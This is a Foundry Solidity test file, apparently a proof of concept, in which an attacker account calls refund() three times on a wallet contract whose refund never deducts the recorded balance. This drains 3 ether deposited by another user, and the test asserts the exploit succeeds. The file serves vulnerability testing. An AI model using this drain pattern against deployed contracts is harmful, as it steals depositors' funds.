// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_02_refund_nosub.sol";

contract WalletTest is Test {
    Wallet public wallet;
    address public creator = address(0x1);
    address public attacker = address(0x2);
    address public depositor = address(0x3);
    
    struct State {
        uint256 contractETH;
        uint256 attackerETH;
        uint256 attackerContractBalance;
        uint256 depositorContractBalance;
    }

    function setUp() public {
        vm.startPrank(creator);
        wallet = new Wallet();
        vm.deal(creator, 10 ether);
        vm.deal(attacker, 1 ether);
        vm.deal(depositor, 5 ether);
        vm.stopPrank();
    }

    function testRefundExploit() public {
        // Depositor funds the contract
        vm.prank(depositor);
        wallet.deposit{value: 5 ether}();

        // Attacker deposits initial funds
        vm.prank(attacker);
        wallet.deposit{value: 1 ether}();
        uint256 attackerStartBalance = attacker.balance;

        console.log("=== BEFORE-Trigger (Initial State) ===");
        State memory pre = State(
            address(wallet).balance,
            attacker.balance,
            wallet.getBalance(attacker),
            wallet.getBalance(depositor)
        );
        console.log("Contract ETH Balance:         ", pre.contractETH);
        console.log("Attacker ETH Balance:         ", pre.attackerETH);
        console.log("Attacker Contract Balance:    ", pre.attackerContractBalance);
        console.log("Depositor Contract Balance:   ", pre.depositorContractBalance);
        
        console.log("=== Trigger (3 Refund Operations) ===");
        // Execute refunds without balance deduction
        for (uint i = 0; i < 3; i++) {
            uint256 contractBalanceBefore = address(wallet).balance;
            uint256 attackerBalanceBefore = attacker.balance;
            
            vm.prank(attacker);
            wallet.refund();
            
            assertEq(
                attacker.balance, 
                attackerBalanceBefore + 1 ether, 
                "Attacker should receive 1 ether per refund"
            );
            assertEq(
                address(wallet).balance, 
                contractBalanceBefore - 1 ether,
                "Contract should lose 1 ether per refund"
            );
            assertEq(
                wallet.getBalance(attacker),
                1 ether,
                "Attacker balance should remain 1 ether"
            );
        }
        
        console.log("=== AFTER-Trigger (Post-Exploit State) ===");
        State memory post = State(
            address(wallet).balance,
            attacker.balance,
            wallet.getBalance(attacker),
            wallet.getBalance(depositor)
        );
        console.log("Contract ETH Balance:         ", post.contractETH);
        console.log("Attacker ETH Balance:         ", post.attackerETH);
        console.log("Attacker Contract Balance:    ", post.attackerContractBalance);
        console.log("Depositor Contract Balance:   ", post.depositorContractBalance);
        
        console.log("=== Differential Analysis ===");
        uint256 contractETHChange = pre.contractETH - post.contractETH;
        uint256 attackerETHGain = post.attackerETH - pre.attackerETH;
        
        console.log("Contract ETH Change (-)      :", contractETHChange); 
        console.log("Attacker ETH Gain (+)        :", attackerETHGain);
        console.log(unicode"Attacker Contract Balance Δ  :", int256(post.attackerContractBalance) - int256(pre.attackerContractBalance));
        console.log(unicode"Depositor Contract Balance Δ  :", int256(post.depositorContractBalance) - int256(pre.depositorContractBalance));
        
        // Vulnerability logic: 3 ether drained without reducing attacker's recorded balance
        bool isVulnerable = 
            contractETHChange == 3 ether && 
            attackerETHGain == 3 ether &&
            post.attackerContractBalance == pre.attackerContractBalance &&  // Should remain 1 ether
            post.depositorContractBalance == pre.depositorContractBalance;  // Should remain 5 ether

        if (isVulnerable) {
            console.log("Vulnerability Exists: Attacker drained 3 ETH without balance reduction");
        } else {
            console.log("Vulnerability not Exist: State change doesn't match exploit pattern");
        }
        
        // Final verification checks
        assertEq(post.contractETH, 3 ether, "Final contract ETH should be 3 ether");
        assertEq(post.attackerETH, attackerStartBalance + 3 ether, "Attacker should gain 3 ether");
        assertEq(post.attackerContractBalance, 1 ether, "Attacker's token balance unchanged");
        assertEq(post.depositorContractBalance, 5 ether, "Depositor's token balance unchanged");
    }
}